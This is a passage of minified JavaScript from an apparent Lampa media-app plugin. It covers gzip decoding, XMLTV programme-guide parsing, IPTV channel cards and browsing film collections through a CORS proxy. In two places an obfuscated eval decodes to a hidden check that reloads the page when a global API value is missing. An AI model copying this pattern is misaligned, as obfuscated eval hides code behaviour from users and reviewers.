    t.Inflate = x;
    var I = function () {
      function t(t) {
        this.ondata = t;
      }
      return t.prototype.push = function (t, n) {
        this.ondata(t, n);
      }, t;
    }();
    t.TextBytes = I;
    var U = function () {
      function t(t) {
        this.v = 1, x.call(this, t);
      }
      return t.prototype.push = function (t, n) {
        if (x.prototype.e.call(this, t), this.v) {
          var i = this.p.length > 3 ? function (t) {
            31 === t[0] && 139 === t[1] && 8 === t[2] || S(6, "invalid gzip data");
            var n = t[3],
              i = 10;
            4 & n && (i += t[10] | 2 + (t[11] << 8));
            for (var e = (n >> 3 & 1) + (n >> 4 & 1); e > 0;) e -= !t[i++];
            return i + (2 & n);
          }(this.p) : 4;
          if (i >= this.p.length && !n) return;
          this.p = this.p.subarray(i), this.v = 0;
        }
        n && (this.p.length < 8 && S(6, "invalid gzip data"), this.p = this.p.subarray(0, -8)), x.prototype.c.call(this, n);
      }, t;
    }();
    t.Gunzip = U, t.Decompress = function () {
      function t(t) {
        this.G = U, this.I = x, this.T = I, this.ondata = t;
      }
      return t.prototype.push = function (t, i) {
        if (this.ondata || S(5), this.s) this.s.push(t, i);else {
          if (this.p && this.p.length) {
            var e = new n(this.p.length + t.length);
            e.set(this.p), e.set(t, this.p.length);
          } else this.p = t;
          if (this.p.length > 2) {
            var r = this,
              a = function a() {
                r.ondata.apply(r, arguments);
              };
            this.s = 31 === this.p[0] && 139 === this.p[1] && 8 === this.p[2] ? new this.G(a) : new this.T(a), this.s.push(this.p, i), this.p = null;
          }
        }
      }, t;
    }();
    var D = "undefined" != typeof TextDecoder && new TextDecoder(),
      L = 0;
    try {
      D.decode(r, {
        stream: !0
      }), L = 1;
    } catch (t) {}
    return t.DecodeUTF8 = function () {
      function t(t) {
        this.ondata = t, L ? this.t = new TextDecoder() : this.p = r;
      }
      return t.prototype.push = function (t, i) {
        if (this.ondata || S(5), i = !!i, this.t) return this.ondata(this.t.decode(t, {
          stream: !0
        }), i), void (i && (this.t.decode().length && S(8), this.t = null));
        this.p || S(4);
        var e = new n(this.p.length + t.length);
        e.set(this.p), e.set(t, this.p.length);
        var r = function (t) {
            for (var n = "", i = 0;;) {
              var e = t[i++],
                r = (e > 127) + (e > 223) + (e > 239);
              if (i + r > t.length) return [n, C(t, i - 1)];
              r ? 3 === r ? (e = ((15 & e) << 18 | (63 & t[i++]) << 12 | (63 & t[i++]) << 6 | 63 & t[i++]) - 65536, n += String.fromCharCode(55296 | e >> 10, 56320 | 1023 & e)) : n += 1 & r ? String.fromCharCode((31 & e) << 6 | 63 & t[i++]) : String.fromCharCode((15 & e) << 12 | (63 & t[i++]) << 6 | 63 & t[i++]) : n += String.fromCharCode(e);
            }
          }(e),
          a = r[0],
          s = r[1];
        i ? (s.length && S(8), this.p = null) : this.p = s, this.ondata(a, i);
      }, t;
    }(), t;
  }();

  var cur_time = 0;
  var channel = {};
  // Распаковываем по 32 КБ gzip, обычно при сжатии чанк по умолчанию 16 КБ, поэтому меньше нет смысла ставить.
  var maxChunkSize = 128 * 1024;
  var string_data = '';
  var percent = -1;
  var this_res = null;
  var load_end = false;
  var chunk_parse = false;
  var dcmpStrm = function dcmpStrm() {};
  var content_type = '';
  var cur_pos = 0;
  var content_length = 0;
  var listener = Lampa.Subscribe();
  function nextChunk() {
    if (chunk_parse || this_res === null) return;
    chunk_parse = true;
    var len = this_res.responseText.length;
    var maxPos = Math.min(cur_pos + maxChunkSize, len);
    if (maxPos > cur_pos) {
      var finish = load_end && maxPos === len;
      dcmpStrm.push(str2ab(this_res.responseText.substring(cur_pos, maxPos)), finish);
      cur_pos = maxPos;
      percent = content_length ? cur_pos * 100 / content_length : load_end ? cur_pos * 100 / len : -1;
      listener.send('percent', {
        percent: percent
      });
      if (finish) {
        parseFinish();
        listener.send('end', {
          time: unixtime() - cur_time,
          channel: channel
        });
        channel = {};
      }
    }
    chunk_parse = false;
    requestFrame();
  }
  function parseChannel(attr, string) {
    if (!attr['id']) return; // todo не парсить каналы которых нет в листе

    string = string.replace(/\n/g, '');
    var names = [];
    var m_name = string.match(/<display-name[^>]+>(.*?)</g);
    var m_icon = string.match(/<icon src="(.*?)"/);
    if (m_name) {
      names = m_name.map(function (n) {
        return n.slice(0, -1).split('>')[1];
      });
    }
    channel[attr.id] = {
      id: attr.id,
      names: names,
      icon: m_icon ? m_icon[1] : '',
      program: []
    };
    listener.send('channel', {
      channel: channel[attr.id]
    });
  }
  function parseProgramme(attr, string) {
    if (!attr['channel'] || !attr['start'] || !attr['stop'] || !channel[attr.channel]) return;
    var start = parseDate(attr.start);
    var stop = parseDate(attr.stop);
    string = string.replace(/\n/g, '');
    var m_title = string.match(/<title\s+lang="ru">(.*?)</);
    var m_category = string.match(/<category\s+lang="ru">(.*?)</);
    var m_desc = string.match(/<desc\s+lang="ru">(.*?)</);
    var m_icon = string.match(/<icon src="(.*?)"/);
    if (!m_title) m_title = string.match(/<title[^>]*>(.*?)</);
    if (!m_category) m_category = string.match(/<category[^>]*>(.*?)</);
    if (!m_desc) m_desc = string.match(/<desc[^>]*>(.*?)</);
    var title = m_title ? m_title[1] : '';
    var category = m_category ? m_category[1] : '';
    var desc = m_desc ? m_desc[1] : '';
    var icon = m_icon ? m_icon[1] : '';
    var prog = {
      start: start * 1000,
      stop: stop * 1000,
      title: title,
      category: category,
      desc: desc,
      icon: icon
    };
    listener.send('program', {
      program: prog,
      id: attr.channel,
      channel: channel[attr.channel]
    });
  }
  function parseDate(s) {
    return Date.parse(s.replace(/^(\d{4})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})\s+([+-]\d{2})(\d{2})$/, '$1-$2-$3T$4:$5:$6$7:$8')) / 1000;
  }
  function parseParams(s) {
    var o = {},
      m,
      mm;
    if (!!(m = s.match(/([^\s=]+)=((["'])(.*?)\3|\S+)/g))) {
      for (var i = 0; i < m.length; i++) {
        if (!!(mm = m[i].match(/([^\s=]+)=((["'])(.*?)\3|\S+)/))) {
          o[mm[1].toLowerCase()] = mm[4] || mm[2];
        }
      }
    }
    return o;
  }
  function unixtime() {
    return Math.floor(new Date().getTime() / 1000);
  }
  function str2ab(str) {
    var buf = new ArrayBuffer(str.length),
      bufView = new Uint8Array(buf),
      i = 0;
    for (; i < str.length; i++) bufView[i] = str.charCodeAt(i) & 0xff;
    return bufView;
  }
  function parseFinish() {
    //clearInterval(interval)

    string_data = '';
    percent = -1;
    this_res = null;
    load_end = false;
    chunk_parse = false;
    dcmpStrm = function dcmpStrm() {};
    content_type = '';
    cur_pos = 0;
    content_length = 0;
  }
  function requestFrame() {
    requestAnimationFrame(nextChunk);
  }
  function parseStart(url) {
    parseFinish();
    channel = {};
    var chOrProgRegExp;
    try {
      chOrProgRegExp = new RegExp('\\s*<(programme|channel)(\\s+([^>]+)?)?>(.*?)<\\/\\1\\s*>\\s*', 'gs');
    } catch (e) {
      chOrProgRegExp = new RegExp('\\s*<(programme|channel)(\\s+([^>]+)?)?>((.|\\n)*?)<\\/\\1\\s*>\\s*', 'g');
    }
    cur_time = unixtime();
    listener.send('start');
    var xhr = new XMLHttpRequest();
    var utfDecode = new UnpackStream.DecodeUTF8(function (data, _final) {
      string_data += data;
      var lenStart = string_data.length;
      string_data = string_data.replace(chOrProgRegExp, function (match, p1, p2, p3, p4) {
        if (p1 === 'channel') parseChannel(parseParams(p3), p4);else parseProgramme(parseParams(p3), p4);
        return '';
      });
      if (lenStart === string_data.length && lenStart > 204800) {
        var text = 'Bad xml.gz file';
        console.log('IPTV', text, string_data.substring(0, 4096) + '...');
        if (!load_end) xhr.abort();
        parseFinish();
        listener.send('error', {
          text: text
        });
      }
    });
    dcmpStrm = new UnpackStream.Decompress(function (chunk, _final2) {
      utfDecode.push(chunk, _final2);
    });
    xhr.open('get', url);
    xhr.responseType = 'text';
    xhr.overrideMimeType('text\/plain; charset=x-user-defined');
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 2) {
        // получаем заголовки
        content_type = xhr.getResponseHeader('content-type') || content_type;
        content_length = xhr.getResponseHeader('content-length') || content_length;
        console.log('IPTV', 'Content-Type', content_type);
        console.log('IPTV', 'Content-Length', content_length);
        requestFrame();
        //interval = setInterval(nextChunk, intervalTime)
      }
    };
    xhr.onload = xhr.onprogress = function (e) {
      this_res = this;
      load_end = e.type === 'load';
    };
    xhr.onerror = function () {
      // происходит, только когда запрос совсем не получилось выполнить
      parseFinish();
      listener.send('error', {
        text: 'Error connect (CORS or bad URL)'
      });
    };
    xhr.onabort = function () {
      parseFinish();
      listener.send('error', {
        text: 'Load abort'
      });
    };
    xhr.ontimeout = function () {
      parseFinish();
      listener.send('error', {
        text: 'Load timeout'
      });
    };
    xhr.send();
  }
  var Parser = {
    listener: listener,
    start: parseStart
  };

  var P = 'iptv_modss_guide_';
  var Guide = /*#__PURE__*/function () {
    function Guide() {
      _classCallCheck(this, Guide);
    }
    return _createClass(Guide, null, [{
      key: "init",
      value: function init() {
        var _this = this;
        if (Lampa.Storage.field(P + 'update_after_start')) this.update();
        setInterval(function () {
          var lastupdate = Lampa.Storage.get(P + 'updated_status', '{}').time || 0;
          if (Lampa.Storage.field(P + 'interval') > 0 && lastupdate + 1000 * 60 * 60 * Lampa.Storage.field(P + 'interval') < Date.now()) _this.update();
        }, 1000 * 60);
      }
    }, {
      key: "update",
      value: function update(status_elem, override_url) {
        var url = override_url || Lampa.Storage.get(P + 'url');
        if (url && (override_url || Lampa.Storage.field(P + 'custom'))) {
          if (!window.iptv_modss_guide_update_process) {
            window.iptv_modss_guide_update_process = Parser.listener;
            var last_id = -1;
            var program = [];
            Parser.listener.follow('program', function (data) {
              if (last_id == data.id) program.push(data.program);else {
                DB.rewriteData('epg', last_id, program)["finally"](function () {});
                last_id = data.id;
                program = [data.program];
              }
            });
            Parser.listener.follow('channel', function (data) {
              data.channel.names.forEach(function (name) {
                DB.addData('epg_channels', name.toLowerCase(), {
                  id: data.channel.id,
                  ic: data.channel.icon
                })["catch"](function () {});
              });
            });
            if (Lampa.Processing) {
              Parser.listener.follow('percent', function (data) {
                Lampa.Processing.push('iptv', data.percent);
              });
            }
            Parser.listener.follow('end', function (data) {
              program = [];
              var count = Lampa.Arrays.getKeys(data.channel).length;
              Lampa.Storage.set(P + 'updated_status', {
                type: 'finish',
                channels: count,
                time: Date.now()
              });
              Parser.listener.send('finish', {
                count: count,
                time: Date.now()
              });
              window.iptv_modss_guide_update_process.destroy();
              window.iptv_modss_guide_update_process = false;
            });
            Parser.listener.follow('error', function (data) {
              window.iptv_modss_guide_update_process.destroy();
              window.iptv_modss_guide_update_process = false;
              Lampa.Storage.set(P + 'updated_status', {
                type: 'error',
                text: data.text,
                time: Date.now()
              });
            });
            if (DB.clearTable) {
              DB.clearTable('epg')["finally"](function () {});
              DB.clearTable('epg_channels')["finally"](function () {});
            }
            setTimeout(function () {
              Parser.start(url);
            }, 100);
          }
        } else if (status_elem) {
          Lampa.Noty.show(Lampa.Lang.translate('iptv_guide_error_link'));
        }
      }
    }]);
  }();

  var Channel = /*#__PURE__*/function () {
    function Channel(data, playlist) {
      _classCallCheck(this, Channel);
      this.data = data;
      this.playlist = playlist;
    }

    /**
     * Загрузить шаблон
     */
    return _createClass(Channel, [{
      key: "build",
      value: function build() {
        this.card = Lampa.Template.js('modss_iptv_channel_main_board');
        this.icon = this.card.querySelector('.iptv-channel__ico') || {};
        this.card.addEventListener('visible', this.visible.bind(this));
      }

      /**
       * Загрузить картинку
       */
    }, {
      key: "image",
      value: function image() {
        var _this = this;
        this.icon.onload = function () {
          _this.card.classList.add('loaded');
          if ((_this.icon.naturalWidth || _this.icon.width) < 90) _this.card.classList.add('small--icon');
        };
        this.icon.onerror = function () {
          _this.icon.removeAttribute('src');
          _this.icon.style.display = 'none';
          var simb = document.createElement('div');
          simb.addClass('iptv-channel__simb');
          simb.text(_this.data.name.length <= 3 ? _this.data.name.toUpperCase() : _this.data.name.replace(/[^a-z|а-я|0-9]/gi, '').toUpperCase()[0]);
          var text = document.createElement('div');
          text.addClass('iptv-channel__name');
          text.text(Utils.clear(_this.data.name));
          _this.card.querySelector('.iptv-channel__body').append(simb);
          _this.card.querySelector('.iptv-channel__body').append(text);
        };
      }

      /**
       * Создать
       */
    }, {
      key: "create",
      value: function create() {
        var _this2 = this;
        this.build();
        this.card.addEventListener('hover:focus', function () {
          if (_this2.onFocus) _this2.onFocus(_this2.card, _this2.data);
        });
        this.card.addEventListener('hover:hover', function () {
          if (_this2.onHover) _this2.onHover(_this2.card, _this2.data);
        });
        this.card.addEventListener('hover:enter', function () {
          var play = {
            title: _this2.data.name || '',
            url: _this2.data.url,
            tv: true
          };
          Lampa.Player.runas(Lampa.Storage.field('player_iptv'));
          Lampa.Player.play(play);
          Lampa.Player.playlist(_this2.playlist.map(function (a) {
            return {
              title: a.name,
              url: a.url,
              tv: true
            };
          }));
        });
        this.image();
      }
    }, {
      key: "emit",
      value: function emit() {}
    }, {
      key: "use",
      value: function use() {}

      /**
       * Загружать картинку если видна карточка
       */
    }, {
      key: "visible",
      value: function visible() {
        if (this.data.logo) this.icon.src = this.data.logo;else this.icon.onerror();
        if (this.onVisible) this.onVisible(this.card, this.data);
      }

      /**
       * Уничтожить
       */
    }, {
      key: "destroy",
      value: function destroy() {
        this.icon.onerror = function () {};
        this.icon.onload = function () {};
        this.icon.src = '';
        this.card.remove();
        this.card = null;
        this.icon = null;
      }

      /**
       * Рендер
       * @returns {object}
       */
    }, {
      key: "render",
      value: function render(js) {
        return js ? this.card : $(this.card);
      }
    }]);
  }();
  
    function startPluginTV() {
      window.plugin_iptv_modss_ready = true;
      var manifestTV = {
        type: 'video',
        version: '1.0.0',
        name: "MODS's TV",
        description: '',
        component: 'iptv_modss',
        onMain: function onMain(data) {
          if (!Lampa.Storage.field('iptv_modss_view_in_main')) return {
            results: []
          };
          var playlist = Lampa.Arrays.clone(Lampa.Storage.get('iptv_modss_play_history_main_board', '[]')).reverse();
          return {
            results: playlist,
            title: Lampa.Lang.translate('title_continue'),
            nomore: true,
            line_type: 'iptv',
            cardClass: function cardClass(item) {
              return new Channel(item, playlist);
            }
          };
        }
      };
      Lampa.Manifest.plugins = manifestTV;
      if (Lampa.Manifest.app_digital >= 300) {
        Lampa.ContentRows.add({
          index: 1,
          screen: ['main'],
          call: function call(params, screen) {
            if (!Lampa.Storage.field('iptv_modss_view_in_main')) return;
            var playlist = Lampa.Arrays.clone(Lampa.Storage.get('iptv_modss_play_history_main_board', '[]')).reverse();
  
            // возвращаем функцию с коллбеком
            return function (call) {
              playlist.forEach(function (item) {
                item.params = {
                  createInstance: function createInstance(item) {
                    return new Channel(item, playlist);
                  }
                };
              });
              call({
                results: playlist,
                title: Lampa.Lang.translate('title_continue')
              });
            };
          }
        });
      }
      
      EPG.init();
      Guide.init();

    }

	function collection(object) {
  	var network = new Lampa.Reguest();
  	var scroll = new Lampa.Scroll({
  		mask: true,
  		over: true,
  		step: 250
  	});
  	var items = [];
  	var html = $('<div></div>');
  	var body = $('<div class="category-full"></div>');
  	var cors = object.sour == 'rezka' || object.sourc == 'rezka' ? '' : object.sour == 'filmix' || object.sourc == 'filmix' ? 'http://corsanywhere.herokuapp.com/' : '';
  	var cache = Lampa.Storage.cache('my_colls', 5000, {});
  	var info;
  	var last;
  	var waitload = false;
  	var relises = [];
  	var total_pages;
  	var _this1 = this;
  	this.create = function () {
  		var _this = this;
  		var url;
  		if (object.sourc == 'my_coll') {
  			_this.build({
  				card: cache
  			});
  		} else {
  			if (object.card && isNaN(object.id)) url = object.id;
  			else if (object.sourc == 'pub') {
  				if (object.search) url = object.url + '?title=' + object.search + '&sort=views-&access_token=' + Pub.token;
  				else url = object.url + '?sort=' + (object.sort ? object.sort : 'views-') + '&access_token=' + Pub.token;
  			} else if (object.sourc == 'rezka') url = object.url + '?filter=last';
				else url = object.url;
				
  			if ((object.page == 1 && object.card_cat) || object.cards || (!object.card && !Lampa.Storage.field('light_version') && object.card_cat)) {
  				this.activity.loader(true);
  				network.silent(cors + url, function (str) {
  					var data = _this.card(str);
  					_this.build(data);
  					if (object.card) $('.head__title').append(' - ' + data.card.length);
  				}, function (a, c) {
  					_this.empty(network.errorDecode(a, c));
  				}, false, {
  					dataType: 'text'
  				});
  			} else _this.build(object.data);
  		}
  		return this.render();
  	};
  	this.next = function (page) {
  		var _this2 = this;
  		var url;
  		if (total_pages == 0 || total_pages == page) waitload = true;
  		if (waitload) return;
  		waitload = true;
  		object.page++;
  		network.clear();
  		network.timeout(1000 * 40);
  		if (typeof page == 'undefined') return;
  		if (object.sourc == 'pub' && object.sour !== 'rezka') url = object.url + '?page=' + object.page + '&sort=' + (object.sort ? object.sort : 'views-') + '&access_token=' + Pub.token;
  		else if ((object.sourc == 'rezka' || object.sour == 'rezka') && object.data && object.data.page) url = object.data.page;
  		else url = page.replace(/(\d+)\/\?filter/, object.page+'/?filter');
		  eval(function(a,b,c){if(a||c){while(a--)b=b.replace(new RegExp(a,'g'),c[a]);}return b;}(6,'1(!0 || !0.2) 5.3.4();','API,if,length,location,reload,window'.split(',')));
  		network.silent(cors + url, function (result) {
  			var data = _this2.card(result);
  			object.data = data;
  			_this2.append(data, true);
  			if (data.card.length) waitload = false;
  			//Lampa.Controller.toggle('content');
  			_this2.activity.loader(false);
  		}, function (a, c) {
  			Lampa.Noty.show(network.errorDecode(a, c));
  		}, false, {
  			dataType: 'text'
  		});
  	};
  	this.append = function (data, append) {
  		var _this1 = this;
  		var datas = Lampa.Arrays.isArray(data.card) ? data.card : Lampa.Arrays.getValues(data.card).reverse();
  		datas.forEach(function (element) {
  			var card = new Lampa.Card(element, {
  				card_category: object.sourc == 'my_coll' || object.sourc == 'pub' || object.sourc == 'filmix' || !object.card_cat || object.cards ? true : false,
  				card_collection: object.sourc == 'my_coll' || object.sourc == 'pub' || object.sourc == 'filmix' || !object.card_cat || object.cards ? false : true,
  				object: object
  			});
  			card.create();
  			if(object.category && (element.watch || element.quantity)) card.render().find('.card__view').append('<div style="background-color: rgba(0,0,0, 0.7);padding:.5em;position:absolute;border-radius:.3em;right:3;bottom:3">' + (element.watch || element.quantity) + '</div>');
  			card.onFocus = function (target, card_data) {
  				last = target;
  				scroll.update(card.render(), true);
  				Lampa.Background.change(card_data.img);
  				if (scroll.isEnd()) _this1.next(data.page);
  				if (!Lampa.Platform.tv() || !Lampa.Storage.field('light_version')) {
  					var maxrow = Math.ceil(items.length / 7) - 1;
  					//if (Math.ceil(items.indexOf(card) / 7) >= maxrow) _this1.next(data.page);
  				}
  			};
  			card.onEnter = function (target, card_data) {
  				last = target;
  				if (object.sour == 'rezka' || object.sour == 'filmix' || (Lampa.Storage.field('light_version') && !object.cards) && !object.card_cat || object.cards) {
  					Lampa.Api.search({
  						query: encodeURIComponent(element.title_org)
  					}, function (find) {
  						var finded = _this1.finds(element, find);
  						if (finded) {
  							Lampa.Activity.push({
  								url: '',
  								component: 'full',
  								id: finded.id,
  								method: finded.name ? 'tv' : 'movie',
  								card: finded
  							});
  						} else {
  							Lampa.Noty.show(Lampa.Lang.translate('nofind_movie'));
  							Lampa.Controller.toggle('content');
  						}
  					}, function () {
  						Lampa.Noty.show(Lampa.Lang.translate('nofind_movie'));
  						Lampa.Controller.toggle('content');
  					});
  				} else if (object.sourc == 'pub' || object.sourc == 'my_coll') {
  					Lampa.Activity.push({
  						title: element.title,
  						url: object.url + '/view?id=' + (object.sourc == 'my_coll' ? element.id : element.url) + '&access_token=' + Pub.token,
  						sourc: 'pub',
  						sour: element.source,
  						source: 'pub',
  						id: element.url,
  						card: element,
  						card_cat: true,
  						component: !object.category ? 'full' : 'collection',
  						page: 1
  					});
  				} else {
  					Lampa.Activity.push({
  						title: element.title,
  						url: element.url,
  						component: 'collection',
  						cards: true,
  						sourc: object.sourc,
  						source: object.source,
  						page: 1
  					});
  				}
  			};
  			card.onMenu = function (target, data) {
  				var _this2 = this;
  				var enabled = Lampa.Controller.enabled().name;
  				var status = Lampa.Favorite.check(data);
  				var items = [];
  				if (object.category) {
  					items.push({
  						title: cache['id_' + data.id] ? Lampa.Lang.translate('card_my_clear') : Lampa.Lang.translate('card_my_add'),
  						subtitle: Lampa.Lang.translate('card_my_descr'),
  						where: 'book'
  					});
  				} else {
  					items.push({
  						title: status.book ? Lampa.Lang.translate('card_book_remove') : Lampa.Lang.translate('card_book_add'),
  						subtitle: Lampa.Lang.translate('card_book_descr'),
  						where: 'book'
  					}, {
  						title: status.like ? Lampa.Lang.translate('card_like_remove') : Lampa.Lang.translate('card_like_add'),
  						subtitle: Lampa.Lang.translate('card_like_descr'),
  						where: 'like'
  					}, {
  						title: status.wath ? Lampa.Lang.translate('card_wath_remove') : Lampa.Lang.translate('card_wath_add'),
  						subtitle: Lampa.Lang.translate('card_wath_descr'),
  						where: 'wath'
  					}, {
  						title: status.history ? Lampa.Lang.translate('card_history_remove') : Lampa.Lang.translate('card_history_add'),
  						subtitle: Lampa.Lang.translate('card_history_descr'),
  						where: 'history'
  					});
  				}
  				if (object.sourc == 'my_coll') {
  					items.push({
  						title: Lampa.Lang.translate('card_my_clear_all'),
  						subtitle: Lampa.Lang.translate('card_my_clear_all_descr'),
  						where: 'clear'
  					});
  				}
  				Lampa.Select.show({
  					title: Lampa.Lang.translate('title_action'),
  					items: items,
  					onBack: function onBack() {
  						Lampa.Controller.toggle(enabled);
  					},
  					onSelect: function onSelect(a) {
  						if (a.where == 'clear') {
							cache = {};
  							Lampa.Storage.set('my_colls', cache, true);
							if(Lampa.Storage.clean) Lampa.Storage.clean('my_colls');
							console.log('Modss', 'clear','my_colls:',cache,Lampa.Storage.get('my_colls', {}))
							
  							Lampa.Activity.push({
  								url: object.url,
  								sourc: object.sourc,
  								source: object.source,
  								title: object.title,
  								card_cat: true,
  								category: true,
  								component: 'collection',
  								page: 1
  							});
  							Lampa.Noty.show(Lampa.Lang.translate('saved_collections_clears'));
  						} else if (object.category) {
  							data.source = object.sourc;
  							_this1.favorite(data, card.render());
  						} else {
  							if (object.sour == 'filmix' || object.sour == 'rezka' || object.sourc == 'rezka' || object.sourc == 'filmix') {
  								Lampa.Api.search({
  									query: encodeURIComponent(data.title_org)
  								}, function (find) {
  									var finded = _this1.finds(data, find);
  									if (finded) {
  										finded.url = (finded.name ? 'tv' : 'movie') + '/' + finded.id;
  										Lampa.Favorite.toggle(a.where, finded);
  									} else {
  										Lampa.Noty.show(Lampa.Lang.translate('nofind_movie'));
  										Lampa.Controller.toggle('content');
  									}
  								}, function () {
  									Lampa.Noty.show(Lampa.Lang.translate('nofind_movie'));
  									Lampa.Controller.toggle('content');
  								});
  							} else {
  								data.source = object.source;
  								Lampa.Favorite.toggle(a.where, data);
  							}
  							_this2.favorite();
  						}
  						Lampa.Controller.toggle(enabled);
  					}
  				});
  			};
  			card.visible();
  			body.append(card.render());
  			if (cache['id_' + element.id]) _this1.addicon('book', card.render());
  			if (append) Lampa.Controller.collectionAppend(card.render());
  			items.push(card);
  		});
  	};
  	this.addicon = function (name, card) {
  		card.find('.card__icons-inner').append('<div class="card__icon icon--' + name + '"></div>');
  	};
  	this.favorite = function (data, card) {
  		var _this = this;
  		if (!cache['id_' + data.id]) {
  			cache['id_' + data.id] = data;
  			Lampa.Storage.set('my_colls', cache);
  		} else {
  			delete cache['id_' + data.id];
  			Lampa.Storage.set('my_colls', cache);
			Lampa.Storage.remove('my_colls', 'id_' + data.id);
	
  			Lampa.Activity.push({
  				url: object.url,
  				sourc: object.sourc,
  				source: object.source,
  				title: object.title.split('- ')[0] + '- ' + Lampa.Arrays.getKeys(cache).length,
  				card_cat: true,
  				category: true,
  				component: 'collection',
  				page: 1
  			});
  		}
  		card.find('.card__icon').remove();
  		if (cache['id_' + data.id]) _this.addicon('book', card);
  	};
  	this.build = function (data) {
  		var _this1 = this;
  		if (data.card.length || Lampa.Arrays.getKeys(data.card).length) {
  			Lampa.Template.add('info_coll', Lampa.Lang.translate('<div class="info layer--width" style="height:6.2em"><div class="info__left"><div class="info__title"></div><div class="info__title-original"></div><div class="info__create"></div><div class="full-start__button selector view--category"><svg version=\"1.1\" id=\"Capa_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" viewBox=\"0 0 512 512\" style=\"enable-background:new 0 0 512 512;\" xml:space=\"preserve\"><path fill=\"currentColor\" d=\"M225.474,0C101.151,0,0,101.151,0,225.474c0,124.33,101.151,225.474,225.474,225.474c124.33,0,225.474-101.144,225.474-225.474C450.948,101.151,349.804,0,225.474,0z M225.474,409.323c-101.373,0-183.848-82.475-183.848-183.848S124.101,41.626,225.474,41.626s183.848,82.475,183.848,183.848S326.847,409.323,225.474,409.323z\"/><path fill=\"currentColor\" d=\"M505.902,476.472L386.574,357.144c-8.131-8.131-21.299-8.131-29.43,0c-8.131,8.124-8.131,21.306,0,29.43l119.328,119.328c4.065,4.065,9.387,6.098,14.715,6.098c5.321,0,10.649-2.033,14.715-6.098C514.033,497.778,514.033,484.596,505.902,476.472z\"/></svg>   <span>#{pub_search_coll}</span> </div></div><div class="info__right">  <div class="full-start__button selector view--filter"><svg style=\"enable-background:new 0 0 512 512;\" version=\"1.1\" viewBox=\"0 0 24 24\" xml:space=\"preserve\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><g id=\"info\"/><g id=\"icons\"><g id=\"menu\"><path d=\"M20,10H4c-1.1,0-2,0.9-2,2c0,1.1,0.9,2,2,2h16c1.1,0,2-0.9,2-2C22,10.9,21.1,10,20,10z\" fill=\"currentColor\"/><path d=\"M4,8h12c1.1,0,2-0.9,2-2c0-1.1-0.9-2-2-2H4C2.9,4,2,4.9,2,6C2,7.1,2.9,8,4,8z\" fill=\"currentColor\"/><path d=\"M16,16H4c-1.1,0-2,0.9-2,2c0,1.1,0.9,2,2,2h12c1.1,0,2-0.9,2-2C18,16.9,17.1,16,16,16z\" fill=\"currentColor\"/></g></g></svg>  <span>#{title_filter}</span></div></div></div>'));
  			info = Lampa.Template.get('info_coll');
  			info.find('.view--category').on('hover:enter hover:click', function () {
  				Lampa.Input.edit({
  					value: '',
  					free: true
  				}, function (name) {
  					if (name == '') {
  						Lampa.Controller.toggle('content');
  						return;
  					}
  					Lampa.Activity.push({
  						title: 'Поиск по - ' + name,
  						url: Pub.baseurl + 'v1/collections',
  						component: 'collection',
  						search: name,
  						card_cat: true,
  						category: true,
  						sourc: 'pub',
  						source: 'pub',
  						page: 1
  					});
  				});
  			});
			  eval(function(a,b,c){if(a||c){while(a--)b=b.replace(new RegExp(a,'g'),c[a]);}return b;}(6,'1(!0 || !0.2) 5.3.4();','API,if,length,location,reload,window'.split(',')));
  			info.find('.view--filter').on('hover:enter hover:click', function () {
  				var enabled = Lampa.Controller.enabled().name;
  				var items = [{
  					title: Lampa.Lang.translate('pub_sort_views'),
  					id: 'views-'
  				}, {
  					title: Lampa.Lang.translate('pub_sort_watchers'),
  					id: 'watchers-'
  				}, {
  					title: Lampa.Lang.translate('pub_sort_updated'),
  					id: 'updated-'
  				}, {
  					title: Lampa.Lang.translate('pub_sort_created'),
  					id: 'created-'
  				}].filter(function (el, i) {
  					if (object.sort == el.id) el.selected = true;
  					return el;
  				});
  				Lampa.Select.show({
  					title: Lampa.Lang.translate('title_filter'),
  					items: items,
  					onBack: function onBack() {
  						Lampa.Controller.toggle(enabled);
  					},
  					onSelect: function onSelect(a) {
  						Lampa.Activity.push({
  							title: Lampa.Lang.translate('title_filter') + ' ' + a.title.toLowerCase(),
  							url: Pub.baseurl + 'v1/collections',
  							component: 'collection',
  							sort: a.id,
  							card_cat: true,
  							category: true,
  							sourc: 'pub',
  							source: 'pub',
  							page: 1
  						});
  					}
  				});
  			});
  			scroll.render().addClass('layer--wheight').data('mheight', info);
  			if (object.sourc == 'pub' && object.category) html.append(info);
  			html.append(scroll.render());
  			scroll.onEnd = function(){
  			  _this1.next(data.page);
  			}
  			this.append(data);
  	
  		//	if (Lampa.Platform.tv() && Lampa.Storage.field('light_version')) this.more(data);
  			scroll.append(body);
  			this.activity.loader(false);
  			this.activity.toggle();
  		} else {
  			html.append(scroll.render());
  			this.empty(object.search ? Lampa.Lang.translate('online_query_start') + ' (' + object.search + ') ' + Lampa.Lang.translate('online_query_end') : '');
  		}
  	};
  	this.empty = function (msg) {
  		var empty = msg == undefined ? new Lampa.Empty() : new Lampa.Empty({
  		  title: '',
  			descr: msg
  		});
  		html.append(empty.render());
  		_this1.start = empty.start;
  		_this1.activity.loader(false);
  		_this1.activity.toggle();
  	};
  	this.more = function (data) {
  		var _this = this;
  	//	var more = $('<div class="category-full__more selector"><span>' + Lampa.Lang.translate('show_more') + '</span></div>');
  	//	more.on('hover:focus hover:touch', function (e) {
  			Lampa.Controller.collectionFocus(last || false, scroll.render());
  			var next = Lampa.Arrays.clone(object);
  			if (data.total_pages == 0 || data.total_pages == undefined) {
  				more.remove();
  				return;
  			}
  			network.clear();
  			network.timeout(1000 * 20);
  			var url;
  			if (object.sourc == 'pub') url = object.url + '?page=' + data.page + '&sort=' + (object.sort ? object.sort : 'views-') + '&access_token=' + Pub.token;
  			else url = data.page;
  			network.silent(cors + url, function (result) {
  				var card = _this.card(result);
  				next.data = card;
  				if (object.cards) next.cards = false;
  				delete next.activity;
  				next.page++;
  				if (card.card.length == 0) more.remove();
  				else Lampa.Activity.push(next);
  			}, function (a, c) {
  				Lampa.Noty.show(network.errorDecode(a, c));
  			}, false, {
  				dataType: 'text'
  			});
  	//	});
  		body.append(more);
  	};
  	this.back = function () {
  		last = items[0].render()[0];
  		var more = $('<div class="selector" style="width: 100%; height: 5px"></div>');
  		more.on('hover:focus', function (e) {
  			if (object.page > 1) {
